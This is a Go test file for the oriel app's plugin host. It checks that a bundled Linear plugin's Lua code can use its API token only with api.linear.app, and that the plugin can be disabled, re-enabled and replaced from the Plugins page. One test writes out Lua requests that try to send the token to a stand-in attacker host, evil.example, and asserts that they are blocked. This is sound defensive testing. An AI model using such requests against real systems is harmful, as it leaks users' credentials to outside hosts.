package app_test

import (
	"path/filepath"
	"strings"
	"testing"

	"github.com/liamg/oriel/app/apptest"
	"github.com/liamg/oriel/app/plugins"
	"github.com/liamg/oriel/integ/linear"
	"github.com/liamg/oriel/integ/linear/lineartest"
	"github.com/liamg/oriel/plugin"
	"github.com/liamg/oriel/plugin/hosttest"
	"github.com/liamg/oriel/registry"
)

// linearConfig is the app reaching the recorded Linear for the internet, with secrets kept in a file of the test's.
func linearConfig(t *testing.T, l *lineartest.Linear) (func(*apptest.Config), *plugin.SecretFile) {
	secrets := &plugin.SecretFile{Path: filepath.Join(t.TempDir(), "secrets.json")}
	return func(cfg *apptest.Config) { cfg.Net, cfg.Secrets = l.Client(), secrets }, secrets
}

// bundledLinear is the app on workDir (the start view if "") with the Linear plugin bundled as oriel ships it
// (linear.Plugin), its process built for the test as Self in place of oriel's own `plugin-process linear`.
func bundledLinear(t *testing.T, l *lineartest.Linear, workDir string) (*apptest.Scene, *plugin.SecretFile) {
	t.Helper()
	dir := hosttest.Install(t, "../integ/linear/plugin", "../integ/linear/cmd/oriel-linear")
	change, secrets := linearConfig(t, l)
	s := apptest.New(t, apptest.Options{WorkDir: workDir, Config: func(cfg *apptest.Config) {
		change(cfg)
		cfg.Bundled = []plugin.Bundled{linear.Plugin}
		cfg.Self = []string{filepath.Join(dir, "bin", "oriel-linear")}
	}})
	s.Frame()
	return s, secrets
}

// The plugin calls oriel.http.get(url, { auth = "LINEAR_TOKEN" }); the host injects the header, and only if the
// request goes to api.linear.app. From the plugin's Lua: the answer comes back, the key never does, and the key
// can't be sent anywhere else.
func TestLuaHTTPWithASecret(t *testing.T) {
	l := lineartest.New(t)
	change, secrets := linearConfig(t, l)
	secrets.SetSecret("LINEAR_TOKEN", lineartest.Key)
	s := apptest.New(t, apptest.Options{Config: change})
	m, err := plugin.LoadManifest(filepath.Join("..", "integ", "linear", "plugin"))
	if err != nil {
		t.Fatal(err)
	}
	g := plugin.NewGrants()
	g.Grant(m.ID, m.Permissions)
	vm := s.PluginVM(plugin.Caller{ID: m.ID, Dir: t.TempDir(), Guard: g})
	s.Frame()
	if err := luaErr(t, vm, `
oriel.http.request({ url = "https://api.linear.app/graphql", method = "POST", body = '{"query":"{ viewer { assignedIssues { nodes { id } } } }"}',
  headers = { ["Content-Type"] = "application/json" }, auth = "LINEAR_TOKEN", auth_scheme = "none" }, function(res, err) got, failed = res, err end)
oriel.http.request({ url = "https://evil.example/collect", auth = "LINEAR_TOKEN" }, function(res, err) evil = err end)
oriel.http.request({ url = "https://evil.example/collect" }, function(res, err) plain = err end)`); err != "" {
		t.Fatal(err)
	}
	s.Until("the answers", func() bool {
		return apptest.LuaGlobal(vm, "got") != nil && apptest.LuaGlobal(vm, "evil") != nil && apptest.LuaGlobal(vm, "plain") != nil
	})
	if st := apptest.LuaGlobal(vm, "got.status"); st != 200.0 {
		t.Errorf("status %v, failed %v", st, apptest.LuaGlobal(vm, "failed"))
	}
	if body, _ := apptest.LuaGlobal(vm, "got.body").(string); !strings.Contains(body, "assignedIssues") || strings.Contains(body, lineartest.Key) {
		t.Errorf("body %q", body)
	}
	if e, _ := apptest.LuaGlobal(vm, "evil").(string); !strings.Contains(e, `isn't declared for evil.example`) {
		t.Errorf("the key to another host: %q", e)
	}
	if e, _ := apptest.LuaGlobal(vm, "plain").(string); !strings.Contains(e, `"net" capability isn't declared for evil.example`) {
		t.Errorf("another host at all: %q", e)
	}
	for _, a := range l.Auths() {
		if !strings.HasPrefix(a, "api.linear.app ") {
			t.Errorf("a request reached %q", a)
		}
	}
}

// The Plugins page lists the bundled Linear as BUNDLED; Disable turns it off (its
// tracker goes) and Enable back on; installing the same id from [plugins] replaces it while it's listed.
func TestBundledPluginOffAndReplaced(t *testing.T) {
	l := lineartest.New(t)
	s, _ := bundledLinear(t, l, "")
	x := apptest.PluginOf[*plugins.Catalog](s, "catalog")
	state := func() string { return x.State("liamg/linear") }
	tracker := func() bool { _, ok := registry.TrackerFor(s.Registry(), "ENG-1"); return ok }
	if !tracker() {
		t.Fatal("the bundled tracker isn't registered")
	}
	s.Run("plugins.open", nil)
	s.Frame()
	s.TypeInto("Filter plugins", "linear")
	s.Frame()
	if text := s.Text(); !strings.Contains(text, "BUNDLED") || !strings.Contains(text, "liamg/linear · loaded") {
		t.Errorf("the Plugins page:\n%s", text)
	}
	s.ClickText("liamg/linear · loaded")
	s.ClickNode("Disable")
	s.Until("it off", func() bool { return state() == "disabled" })
	if tracker() {
		t.Error("the tracker outlived Disable")
	}
	s.ClickNode("Enable")
	s.Until("it on", func() bool { return state() == "loaded" })
	if !tracker() {
		t.Error("Enable didn't bring the tracker back")
	}

	s.Run("plugins.install", registry.Args{"id": "liamg/linear", "path": filepath.Join("..", "integ", "linear", "plugin")})
	syncPlugins(s, t)
	s.Until("it replaced", func() bool { return state() == "replaced by its install" })
	s.Run("plugins.uninstall", registry.Args{"id": "liamg/linear"})
	syncPlugins(s, t)
	s.Until("it back", func() bool { return state() == "loaded" })
}
